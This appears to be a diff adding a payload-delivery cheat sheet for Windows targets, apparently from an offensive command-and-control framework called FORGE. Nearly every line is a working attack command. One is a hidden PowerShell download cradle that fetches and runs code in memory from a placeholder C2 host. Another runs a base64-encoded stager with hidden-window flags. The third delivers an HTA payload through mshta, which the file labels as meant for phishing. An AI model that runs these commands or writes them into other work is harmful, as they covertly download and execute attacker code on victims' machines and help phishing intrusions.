@@ -1,0 +1,12 @@
+# FORGE Payload Delivery — PowerShell
+# For Windows targets. Encode the stager and execute in memory.
+
+# Option 1: Download cradle (modify URL to staging server)
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://C2_HOST:443/cdn/assets/main.js')"
+
+# Option 2: Encoded command (paste stager.py content, base64 encode)
+# python3 -c "import base64; print(base64.b64encode(open('stager.py','rb').read()).decode())"
+# Then: powershell -nop -w hidden -enc <BASE64_OUTPUT>
+
+# Option 3: HTA delivery (for phishing)
+# mshta https://C2_HOST:443/static/health
